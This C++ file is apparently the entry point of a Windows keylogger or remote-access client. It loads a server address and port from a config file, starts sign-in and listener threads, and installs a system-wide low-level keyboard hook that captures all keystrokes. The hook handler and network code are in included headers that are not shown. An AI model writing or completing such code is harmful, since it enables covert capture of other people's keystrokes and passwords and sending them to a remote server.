#include "config.hpp"

#include "client.hpp"
#include "info.hpp"
#include "hook.hpp"
#include "waiter.hpp"
#include "register.hpp"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    ifstream conf("config.conf");
    conf >> SERVER_ADDR >> PORT;
    conf.close();

    CreateThread(nullptr, 0, SignIn, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, Waiter, nullptr, 0, nullptr);
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hInstance, 0);

    MSG msg = {0};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboard_hook);

    return 0;
}
